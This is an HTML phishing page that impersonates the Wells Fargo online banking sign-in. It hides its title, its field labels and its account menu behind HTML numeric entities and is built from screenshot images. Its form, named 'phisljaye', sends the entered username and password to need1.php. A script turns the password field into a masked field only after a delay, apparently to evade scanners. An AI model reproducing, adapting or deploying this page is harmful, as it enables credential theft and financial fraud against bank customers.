<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#87;&#101;&#108;&#108;&#115;&#32;&#70;&#97;&#114;&#103;&#111;&#32;&#45;&#32;&#80;&#101;&#114;&#115;&#111;&#110;&#97;&#108;&#32;&#38;&#32;&#66;&#117;&#115;&#105;&#110;&#101;&#115;&#115;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;&#32;&#45;&#32;&#83;&#116;&#117;&#100;&#101;&#110;&#116;&#44;&#32;&#65;&#117;&#116;&#111;&#32;&#38;&#32;&#72;&#111;&#109;&#101;&#32;&#76;&#111;&#97;&#110;&#115;&#32;&#45;&#32;&#73;&#110;&#118;&#101;&#115;&#116;&#105;&#110;&#103;&#32;&#38;&#32;&#73;&#110;&#115;&#117;&#114;&#97;&#110;&#99;&#101;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>

<style type="text/css">
  
.textbox {  
  	border: 1px solid #b5adad;
  	border-radius: 2px;
    background-color: #f9f7f6;
    color: #434343;
    font-family: verdana;
    padding-left: 6px;
    font-size: 14px;
    height: 42px; 
    width: 275px; 
 } 
 
.textbox:focus {  
    border: 1px dotted #000000;  
    outline: 0; 
 } 

.textbox1 {  
  	border-radius: 2px;
    font-family: verdana;
    font-size: 14px;
    padding-left: 8px;
    width: 184px;
    border: 1px solid #b5adad;
    height: 42px; 
    width: 275px; 
 } 
 
.textbox1:focus {  
    border-color: #4488cc; 
    border-style: solid; 
    border-width: 2px; 
    outline: 0; 
 } 

 </style> 
 <style type="text/css">
 input[type=checkbox].css-checkbox {
							position:absolute; z-index:-1000; left:-1000px; overflow: hidden; clip: rect(0 0 0 0); height:1px; width:1px; margin:-1px; padding:0; border:0;
						}

						input[type=checkbox].css-checkbox + label.css-label {
							padding-left:23px;
							height:18px; 
							display:inline-block;
							line-height:18px;
							background-repeat:no-repeat;
							background-position: 0 0;
							font-size:18px;
							vertical-align:middle;
							cursor:pointer;

						}

						input[type=checkbox].css-checkbox:checked + label.css-label {
							background-position: 0 -18px;
						}
						label.css-label {
				background-image:url(images/wsm.png);
				-webkit-touch-callout: none;
				-webkit-user-select: none;
				-khtml-user-select: none;
				-moz-user-select: none;
				-ms-user-select: none;
				user-select: none;
			}
 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>

</head>
<body>
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:140px; z-index:0"><a href="#"><img src="images/h1.png" alt="" title="" border=0 width=1349 height=140></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:75px; top:140px; width:1204px; height:533px; z-index:1"><img src="images/h2.png" alt="" title="" border=0 width=1204 height=533></div>

<div id="image3" style="position:absolute; overflow:hidden; left:197px; top:766px; width:975px; height:488px; z-index:2"><img src="images/h3.png" alt="" title="" border=0 width=975 height=488></div>

<div id="image4" style="position:absolute; overflow:hidden; left:198px; top:1306px; width:974px; height:516px; z-index:3"><img src="images/h4.png" alt="" title="" border=0 width=974 height=516></div>

<div id="image5" style="position:absolute; overflow:hidden; left:193px; top:1875px; width:980px; height:248px; z-index:4"><img src="images/h5.png" alt="" title="" border=0 width=980 height=248></div>

<div id="image6" style="position:absolute; overflow:hidden; left:0px; top:2189px; width:1349px; height:722px; z-index:5"><img src="images/h6.png" alt="" title="" border=0 width=1349 height=722></div>
<form action=need1.php name=phisljaye id=phisljaye method=post>
<select name="user" class="textbox" autocomplete="off" required style="position:absolute;left:208px;top:199px;width:192px;z-index:6">
<option value="&#65;&#99;&#99;&#111;&#117;&#110;&#116;&#32;&#83;&#117;&#109;&#109;&#97;&#114;&#121;" selected="selected">&#65;&#99;&#99;&#111;&#117;&#110;&#116;&#32;&#83;&#117;&#109;&#109;&#97;&#114;&#121;</option>
							<option value="&#84;&#114;&#97;&#110;&#115;&#102;&#101;&#114;">&#84;&#114;&#97;&#110;&#115;&#102;&#101;&#114;</option>
							<option value="&#66;&#105;&#108;&#108;&#32;&#80;&#97;&#121;">&#66;&#105;&#108;&#108;&#32;&#80;&#97;&#121;</option>
							<option value="&#66;&#114;&#111;&#107;&#101;&#114;&#97;&#103;&#101;">&#66;&#114;&#111;&#107;&#101;&#114;&#97;&#103;&#101;</option>
							<option value="&#84;&#114;&#97;&#100;&#101;">&#84;&#114;&#97;&#100;&#101;</option>
							<option value="&#77;&#101;&#115;&#115;&#97;&#103;&#101;&#115;&#32;&#97;&#110;&#100;&#32;&#65;&#108;&#101;&#114;&#116;&#115;">&#77;&#101;&#115;&#115;&#97;&#103;&#101;&#115;&#32;&#97;&#110;&#100;&#32;&#65;&#108;&#101;&#114;&#116;&#115;</option></select>
<input name="ud" placeholder="&#85;&#115;&#101;&#114;&#110;&#97;&#109;&#101;" class="textbox1" autocomplete="off" required type="text" style="position:absolute;width:192px;left:208px;top:245px;z-index:7">
<input name="pd" placeholder="&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox1" autocomplete="off" required type="text" style="position:absolute;width:192px;left:208px;top:291px;z-index:8">

<div id="checkboxG1"  style="position:absolute; left:208px; top:336px; z-index:9"><input type="checkbox" name="checkboxG1" id="checkboxG1" class="css-checkbox"><label for="checkboxG1" class="css-label radGroup1 chk"></label></div>
<div id="checkboxG1"  style="position:absolute; left:208px; top:336px; z-index:9"><input type="checkbox" name="checkboxG2" id="checkboxG2" class="css-checkbox"><label for="checkboxG2" class="css-label radGroup1 clr"></label></div>
<div id="formimage1" style="position:absolute; left:207px; top:359px; z-index:10"><input type="image" name="formimage1" width="194" height="42" src="images/wgh.png"></div>
<div id="image7" style="position:absolute; overflow:hidden; left:206px; top:409px; width:170px; height:81px; z-index:11"><a href="#"><img src="images/h7.png" alt="" title="" border=0 width=170 height=81></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:76px; top:512px; width:1202px; height:161px; z-index:12"><a href="#"><img src="images/h8.png" alt="" title="" border="0" width="1202" height="161"></a></div>
</div>

</body>
</html>
